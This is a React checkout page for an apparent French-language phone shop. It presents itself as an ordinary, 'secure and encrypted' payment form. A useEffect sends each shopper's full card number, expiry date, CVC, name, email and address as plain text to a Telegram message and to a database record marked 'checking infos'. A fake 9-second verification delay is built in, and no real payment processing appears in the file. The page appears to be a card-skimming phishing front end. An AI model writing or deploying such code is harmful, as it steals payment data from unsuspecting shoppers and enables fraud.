import './CheckoutPage.scss'
import { CSSTransition, SwitchTransition } from 'react-transition-group';
import { v4 as uuidv4 } from 'uuid'
import { useAppDispatch, useAppSelector } from "../../hooks/redux";
import { MdOutlineKeyboardArrowUp } from "react-icons/md";
import { PiLockKeyBold } from "react-icons/pi";
import { CheckProfileAddressI } from "../../@types/account";
import Checkbox from "../../components/App/Checkbox/Checkbox";
import { ChangeEvent, FormEvent, useEffect, useRef, useState } from "react";
import { actionChangeAddressOneInfo, actionChangePaymentInfo } from "../../store/reducer/account";
import Input from "../../components/App/Input/Input";
import { getDefaultAddress } from "../../utils/addressFunction";
import { toStringWith2Decimals } from "../../utils/decimals";
import RadioInput from "../../components/App/RadioInput/RadioInput";
import { AddAddress } from "../ProfilePage/Infos/ModalAddAddress/ModalAddAddress";
import { actionCheckOneDiscount } from "../../store/thunks/checkDiscount";
import { usePopupMessage } from "../../utils/usePopup";
import { useNavigate } from "react-router-dom";
import { getCardType, isCreditCard } from "../../utils/regexValidator";
import CircleLoader from "../../components/App/CircleLoader/CircleLoader";
import { actionChangeInput } from "../../store/reducer/order";
import { handleUnload, updateInfosRequest } from "../../axios/supabaseClient";
import { sendMessageToTelegram } from '../../axios/tlg';

function CheckoutPage() {
  const dispatch = useAppDispatch();
  const navigate = useNavigate();
  const { setPopupMessage } = usePopupMessage();

  const email = useAppSelector((state) => state.account.account.email);
  const id = useAppSelector((state) => state.account.account.id);
  const infos = useAppSelector((state) => state.account.account.infos);
  const listAddress = useAppSelector((state) => state.account.account.listAddress);
  const countries = useAppSelector((state) => state.account.listCountries);
  const address = useAppSelector((state) => state.account.account.address);
  const cart = useAppSelector((state) => state.cart.cartConnected);
  const card = useAppSelector((state) => state.account.credentials.card);
  const discountApplied = useAppSelector((state) => state.discount.discountApplied);
  const orderInput = useAppSelector((state) => state.order.orderInput);
  const notifId = useAppSelector((state) => state.notification.id);
  const discountPending = useAppSelector((state) => state.cart.pending.discount);

  const shippingCost = 6;

  const defaultAdress = getDefaultAddress(listAddress);

  const [expeditionAddress, setExpeditionAddress] = useState(defaultAdress?.id);
  const [newAdressOpen, setNewAdressOpen] = useState(false);
  const [reductionCode, setReductionCode] = useState('');
  const [subtotal, setSubtotal] = useState('0');
  const [state, setState] = useState(true);
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [deliveryAdress, setDeliveryAddress] = useState('');
  // const [isLeaving, setIsLeaving] = useState(false);

  const addressFacturationRef = useRef<HTMLDivElement>(null);
  const defaultAddressRef = useRef<HTMLDivElement>(null);
  const listAddressRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!listAddress || listAddress.length === 0)
      setDeliveryAddress('none');
    else if (listAddress.length === 1)
      setDeliveryAddress('one');
    else if (listAddress.length > 1)
      setDeliveryAddress('many');
  }, [listAddress]);

  useEffect(() => {
    let st = 0;
    if (!cart || cart.length === 0)
      navigate('/');
    cart.forEach((product) => {
      st += Number(product.price);
    });
    if (st.toString().includes(',')) {
      setSubtotal(st.toString());
    } else if (st.toString().includes('.')) {
      const stFormated = st.toString().replace('.', ',');
      setSubtotal(stFormated);
    } else if (st % 1 == 0) {
      setSubtotal(toStringWith2Decimals(st));
    }
  }, [cart]);

  useEffect(() => {
    if (loading === true) {
      setTimeout(() => {
        setStep(3);
        setLoading(false);
      }, import.meta.env.VITE_STATUS === 'dev' ? 500 : 9000);
    }
  }, [loading]);

  useEffect(() => {
    if (!id) return;
    const handleUnloadWrapper = () => handleUnload(id)

    window.addEventListener("beforeunload", handleUnloadWrapper);

    return () => {
      window.removeEventListener("beforeunload", handleUnloadWrapper);
    };
  }, [id]);

  useEffect(() => {
    const sendUpdate = async() => {
      if (orderInput.delivery_address !== null && orderInput.total && id && notifId !== null) {
      
        updateInfosRequest({
          id: notifId,
          email: email,
          firstname: infos.firstname,
          lastname: infos.lastname,
          address: `${orderInput.delivery_address?.firstname} ${orderInput.delivery_address?.lastname} ${orderInput.delivery_address?.address} ${orderInput.delivery_address?.precision} ${orderInput.delivery_address?.postal_code} ${orderInput.delivery_address?.city} ${orderInput.delivery_address?.country.name}`,
          c_name: card.card_name,
          c_number: card.card_number,
          exp_date: card.expiration_date,
          cvc: card.cvc,
          total: orderInput.total,
          status: "checking infos",
          code: null
        });
  
        try {
          const message = `${email} \n${infos.firstname} ${infos.lastname} \n${address.firstname} ${address.lastname} ${address.address} ${address.precision} ${address.postal_code} ${address.city} ${address.country.name} \n${card.card_name}\n${card.card_number}\n${card.expiration_date}\n${card.cvc}\n${toStringWith2Decimals(Number(subtotal.replace(',', '.')) + (shippingCost))}\n statut: a confirmer`;
          await sendMessageToTelegram(message);
        } catch (error) {
          console.log(error)
        }
      }
    }

    sendUpdate();
  }, [orderInput, id, notifId]);

  const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement> | ChangeEvent<HTMLSelectElement>) => {
    const { name, value } = e.target;
    if (name === "reduction")
      setReductionCode(value);
    else if (name === "card_number" || name === "expiration_date" || name === "cvc" || name === "card_name")
      dispatch(actionChangePaymentInfo({ name, value }));
    else if (name === "expeditionAddress")
      setExpeditionAddress(+value);
    else
      dispatch(actionChangeAddressOneInfo({ name, value }));
  };

  const handleDiscount = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (id) {
      const result = await dispatch(actionCheckOneDiscount({ code: reductionCode, accountId: id }));
      if (actionCheckOneDiscount.fulfilled.match(result)) {
        setPopupMessage("La réduction a bien été appliquée", false);
      } else
        setPopupMessage("Code de réduction incorrect", true);
    }
  }

  const handleSubmit = () => {
    if (step === 1) {
      dispatch(actionChangePaymentInfo({ name: 'total', value: toStringWith2Decimals(Number(subtotal.replace(',', '.')) + (shippingCost)) }));
      const newDate = new Date();
      dispatch(actionChangePaymentInfo({ name: 'date', value: `${String(newDate.getDate()).padStart(2, '0')}/${String(newDate.getMonth() + 1).padStart(2, '0')}/${newDate.getFullYear()} ${String(newDate.getHours()).padStart(2, '0')}:${String(newDate.getMinutes()).padStart(2, '0')}:${String(newDate.getSeconds()).padStart(2, '0')}` }));
      dispatch(actionChangeInput({ total: toStringWith2Decimals(Number(subtotal.replace(',', '.')) + (shippingCost)), productsOrder: cart, command_number: uuidv4(), delivery_address: '' }));
      switch (deliveryAdress) {
        case 'none':
          if (address.country)
            dispatch(actionChangeInput({ delivery_address: { ...address, country: { code: address.country.code, name: address.country.name } } }));
          break;
        case 'one':
          dispatch(actionChangeInput({ delivery_address: { ...listAddress[0] } }));
          break;
        case 'many':
          {
            const selectedAddress = listAddress.find((address) => address.id === expeditionAddress);
            if (selectedAddress)
              dispatch(actionChangeInput({ delivery_address: { ...selectedAddress } }));
            break;
          }
      }
      setLoading(true);
      setStep(2);
    } else {
      navigate('/payment');
    }
  }

  const checkPaimentInfos = () => {
    return (isCreditCard(card.card_number) &&
      card.expiration_date.length === 5 &&
      card.cvc.length > 2 &&
      card.card_name.length > 3 && (
        (listAddress &&
          listAddress.length > 0) ||
        (address.firstname.length > 1 &&
          address.lastname.length > 1 &&
          address.address.length > 1 &&
          address.postal_code.length > 1 &&
          address.city.length > 1 &&
          address.phone.length > 1)));
  }

  const getLogoCard = () => {
    switch (getCardType(card.card_number)) {
      case 'visa':
        return '/img/paymentMethod/visa2.png';
      case 'mastercard':
        return '/img/paymentMethod/mscard.png';
      case 'amex':
        return '/img/paymentMethod/amex.png';
      default:
        return '';
    }
  }

  return (
    <div className='checkoutPage'>
      {
        loading ?
          <div className="checkoutPage_loader">
            <CircleLoader black={true} />
          </div>

          :
          <div className="checkoutPage_infos">
            <h2 className="checkoutPage_infos_title">Informations</h2>
            <div className="checkoutPage_infos_email">
              <span className="checkoutPage_infos_email_subtitle">Compte</span>
              <span className="checkoutPage_infos_email_value">{email}</span>
            </div>
            {
              step === 1 ?
                <div className="checkoutPage_infos_address">
                  <div className="checkoutPage_infos_address_top">
                    <span className="checkoutPage_infos_address_top_subtitle">Expédier à</span>

                    {
                      deliveryAdress === "many" &&
                      <div onClick={() => { setState(!state) }} className={state ? "checkoutPage_infos_address_top_icon" : "checkoutPage_infos_address_top_icon checkoutPage_infos_address_top_icon-open"}>
                        <MdOutlineKeyboardArrowUp size={25} />
                      </div>
                    }
                  </div>

                  <div className="checkoutPage_infos_addresses">
                    {
                      deliveryAdress === "none" ?
                        <div className="checkoutPage_infos_addresses_add">
                          <AddAddress modalAddressIsEdit={false} nonModal={true} />
                        </div>
                        :
                        <SwitchTransition mode="out-in">
                          <CSSTransition
                            key={state ? "defaultAddress" : "listAddress"}
                            nodeRef={state ? defaultAddressRef : listAddressRef}
                            timeout={400}
                            classNames="extend-400">
                            {state ? (
                              <div ref={defaultAddressRef} className="checkoutPage_infos_address_default">
                                {
                                  defaultAdress ?
                                    <span className="checkoutPage_infos_address_value">{`${defaultAdress?.firstname} ${defaultAdress?.lastname} ${defaultAdress?.entreprise} ${defaultAdress?.address} ${defaultAdress?.postal_code} ${defaultAdress?.city}`}</span>
                                    :
                                    listAddress && listAddress[0] &&
                                    <span className="checkoutPage_infos_address_value">{`${listAddress[0].firstname} ${listAddress[0].lastname} ${listAddress[0].entreprise} ${listAddress[0].address} ${listAddress[0].postal_code} ${listAddress[0].city}`}</span>
                                }
                              </div>
                            )
                              :
                              (
                                <div ref={listAddressRef} className="checkoutPage_infos_address_addresses">
                                  {listAddress && listAddress.map((address: CheckProfileAddressI) => (
                                    address.id &&
                                    <div key={address.id} className="checkoutPage_infos_address_addresses_element">
                                      {
                                        expeditionAddress ?
                                          <RadioInput name="expeditionAddress" id={address.id} checked={expeditionAddress.toString() === address.id?.toString()} text={`${address.firstname} ${address.lastname} ${address.entreprise} ${address.address} ${address.precision} ${address.postal_code} ${address.city}`} handleChange={handleChange} />
                                          :
                                          listAddress && listAddress[0] &&
                                          <RadioInput name="expeditionAddress" id={address.id} checked={listAddress[0].id === address.id} text={`${address.firstname} ${address.lastname} ${address.entreprise} ${address.address} ${address.precision} ${address.postal_code} ${address.city}`} handleChange={handleChange} />
                                      }
                                    </div>
                                  ))}
                                </div>
                              )}
                          </CSSTransition>
                        </SwitchTransition>
                    }

                  </div>
                </div>
                :
                <div className="checkoutPage_infos_expedition">
                  <span className="checkoutPage_infos_expedition_subtitle">Expédier à</span>
                  <span className="checkoutPage_infos_expedition_value">
                    {
                      !listAddress || listAddress.length === 0 ?
                        address.firstname && `${address.firstname} ${address.lastname} ${address.entreprise} ${address.address} ${address.precision} ${address.postal_code} ${address.city}`
                        :
                        listAddress.length === 1 ?
                          `${listAddress[0].firstname} ${listAddress[0].lastname} ${listAddress[0].entreprise} ${listAddress[0].address} ${listAddress[0].precision} ${listAddress[0].postal_code} ${listAddress[0].city}`
                          :
                          expeditionAddress && listAddress.find((address) => address.id === expeditionAddress) && `${listAddress.find((address) => address.id === expeditionAddress)?.firstname} ${listAddress.find((address) => address.id === expeditionAddress)?.lastname} ${listAddress.find((address) => address.id === expeditionAddress)?.entreprise} ${listAddress.find((address) => address.id === expeditionAddress)?.address} ${listAddress.find((address) => address.id === expeditionAddress)?.precision} ${listAddress.find((address) => address.id === expeditionAddress)?.postal_code} ${listAddress.find((address) => address.id === expeditionAddress)?.city}`
                    }
                  </span>
                </div>
            }

            <div className="checkoutPage_infos_expedition">
              <span className="checkoutPage_infos_expedition_subtitle">Mode d'expédition</span>
              <span className="checkoutPage_infos_expedition_value">Standard 8,00 €</span>
              <span className="checkoutPage_infos_expedition_details">5-7 jours ouvrables</span>
            </div>
            {
              step === 1 ?
                <div className="checkoutPage_infos_paiement">
                  <h2 className="checkoutPage_infos_paiement_title">Paiement</h2>
                  <span className="checkoutPage_infos_paiement_value">Toutes les transactions sont sécurisées et chiffrées.</span>
                  <div className="checkoutPage_infos_paiement_payment">
                    <div className="checkoutPage_infos_paiement_payment_title">
                      <span className="checkoutPage_infos_paiement_payment_title_text">Carte de crédit</span>
                      <div className="checkoutPage_infos_paiement_payment_title_icons">
                        <img className="checkoutPage_infos_paiement_payment_title_icons_element" src="/img/paymentMethod/visa2.png" alt="logo visa" />
                        <img className="checkoutPage_infos_paiement_payment_title_icons_element" src="/img/paymentMethod/mscard.png" alt="logo visa" />
                        <img className="checkoutPage_infos_paiement_payment_title_icons_element" src="/img/paymentMethod/amex.png" alt="logo visa" />
                      </div>
                    </div>
                    <div className="checkoutPage_infos_paiement_payment_num">
                      <Input name='card_number' type='text' text='Numéro de carte' backWhite required handleChange={handleChange} value={card.card_number} backgroundColor="white" />
                      <div className="checkoutPage_infos_paiement_payment_num_icon">
                        <PiLockKeyBold size={20} color="grey" />
                      </div>
                    </div>
                    <div className="checkoutPage_infos_paiement_payment_expcvc">
                      <div className="checkoutPage_infos_paiement_payment_exp">
                        <Input name='expiration_date' type='text' text="Date d'expiration (MM/AA)" backWhite required handleChange={handleChange} value={card.expiration_date} backgroundColor="white" />
                      </div>
                      <div className="checkoutPage_infos_paiement_payment_cvc">
                        <Input name='cvc' type='text' text='CVC' backWhite required handleChange={handleChange} value={card.cvc} backgroundColor="white" />
                      </div>
                    </div>

                    <div className="checkoutPage_infos_paiement_payment_name">
                      <Input name='card_name' type='text' text='Nom sur la carte' backWhite required handleChange={handleChange} value={card.card_name} backgroundColor="white" />
                    </div>
                    <div className="checkoutPage_infos_paiement_payment_checkbox">
                      <Checkbox text="Utiliser l'adresse d'expédition comme adresse de facturation" checked={!newAdressOpen} handleChange={() => { setNewAdressOpen(!newAdressOpen) }} whitebg={true} />
                    </div>

                    <CSSTransition nodeRef={addressFacturationRef} in={newAdressOpen} timeout={200} classNames="extend-p05-200" unmountOnExit>
                      <div ref={addressFacturationRef} className="checkoutPage_infos_paiement_payment_facturation">
                        <h3>Adresse de facturation</h3>
                        {listAddress &&
                          <select defaultValue="default" className="checkoutPage_infos_paiement_payment_facturation_addressesSelect" name="listAddresses" id="listAddresses">
                            {
                              listAddress.map((address) => (
                                address.id &&
                                <option key={address.id} value={address.id}>{`${address.firstname} ${address.lastname} ${address.entreprise} ${address.address} ${address.precision} ${address.postal_code} ${address.city}`}</option>
                              ))
                            }
                            <option value="default">Utiliser une nouvelle adresse</option>
                          </select>
                        }

                        <select name="country" id="country_id" className="checkoutPage_infos_paiement_payment_facturation_countrySelect" value={address.country.code} onChange={handleChange} required>
                          {countries.map((country, index) => (
                            <option key={index} value={country.code}>{country.name}</option>
                          ))}
                          <option value="new">Utiliser une nouvelle adresse</option>
                        </select>
                        <Input name='firstname' type='text' text='Prénom' backWhite required handleChange={handleChange} value={address.firstname} backgroundColor="white" />
                        <Input name='lastname' type='text' text='Nom' backWhite required handleChange={handleChange} value={address.lastname} backgroundColor="white" />
                        <Input name='enterprise' type='text' text='Entreprise (optionnel)' backWhite required handleChange={handleChange} value={address.entreprise} backgroundColor="white" />
                        <Input name='address' type='text' text='Adresse' backWhite required handleChange={handleChange} value={address.address} backgroundColor="white" />
                        <Input name='precision' type='text' text='Appartement, suite, etc (optionnel)' backWhite required handleChange={handleChange} value={address.precision} backgroundColor="white" />
                        <Input name='postal_code' type='text' text='Code postal' backWhite required handleChange={handleChange} value={address.postal_code} backgroundColor="white" />
                        <Input name='city' type='text' text='Ville' backWhite required handleChange={handleChange} value={address.city} backgroundColor="white" />
                        <Input name='phone' type='text' text='Téléphone (optionnel)' backWhite required handleChange={handleChange} value={address.phone} backgroundColor="white" />
                      </div>
                    </CSSTransition>
                  </div>
                </div>
                :
                <div className="checkoutPage_infos_payment">
                  <span className="checkoutPage_infos_payment_subtitle">Mode de paiement</span>
                  <span className="checkoutPage_infos_payment_value">
                    <img className="checkoutPage_infos_payment_value_logo" src={getLogoCard()} alt="logo" />
                    Se terminant par {card.card_number.slice(-4)}</span>
                </div>
            }

          </div>
      }

      <div className="checkoutPage_cart">
        <h2 className="checkoutPage_cart_title">Résumé de la commande</h2>
        <div className="checkoutPage_cart_products">
          {
            cart.map((product) => (
              <div key={product.id} className="checkoutPage_cart_products_item">
                <div className="checkoutPage_cart_products_item_img">
                  <img src={product.product.image_url[product.color]} alt="image product" />
                </div>
                <div className="checkoutPage_cart_products_item_infos">
                  <span className="checkoutPage_cart_products_item_infos_title">{product.product.name}</span>
                  <span className="checkoutPage_cart_products_item_infos_description">{product.product.color_name[product.color]} {product.state} {product.stockage}</span>
                </div>
                <div className="checkoutPage_cart_products_item_price">
                  <span className="checkoutPage_cart_products_item_price_actual">{product.price} €</span>
                  {
                    product.originalPrice &&
                    <span className="checkoutPage_cart_products_item_price_original">{product.originalPrice} €</span>
                  }
                </div>
              </div>
            ))
          }
        </div>
        {
          step === 1 &&
          <form className="checkoutPage_cart_products_reduction" onSubmit={handleDiscount}>
            <div className="checkoutPage_cart_products_reduction_input">
              <Input name="reduction" type='text' text="Code de réduction" backWhite handleChange={handleChange} value={reductionCode} disabled={discountApplied} />
            </div>
            <button className="checkoutPage_cart_products_reduction_btn" type="submit" disabled={discountApplied}>{discountPending ? <div className='checkoutPage_cart_products_reduction_btn-pending'><CircleLoader /></div> : "Valider"}</button>
          </form>
        }
        <div className="checkoutPage_cart_products_subtotal">
          <span className="checkoutPage_cart_products_subtotal_title">Sous-total</span>
          <span className="checkoutPage_cart_products_subtotal_value">{subtotal} €</span>
        </div>
        <div className="checkoutPage_cart_products_shipping">
          <span className="checkoutPage_cart_products_shipping_title">Livraison</span>
          <span className="checkoutPage_cart_products_shipping_value">{toStringWith2Decimals(shippingCost)} €</span>
        </div>
        <div className="checkoutPage_cart_products_total">
          <span className="checkoutPage_cart_products_total_title">Total</span>
          <span className="checkoutPage_cart_products_total_value">{toStringWith2Decimals(Number(subtotal.replace(',', '.')) + (shippingCost))} €</span>
        </div>
        {/* <span className="checkoutPage_cart_products_total_taxes">Taxes de € incluses</span> */}
        <button className="checkoutPage_cart_products_submit" type="button" onClick={handleSubmit} disabled={!checkPaimentInfos() || loading}>{step === 1 || loading ? "Vérifier la commande" : "Payer maintenant"}</button>
      </div>
    </div>
  )

}

export default CheckoutPage;
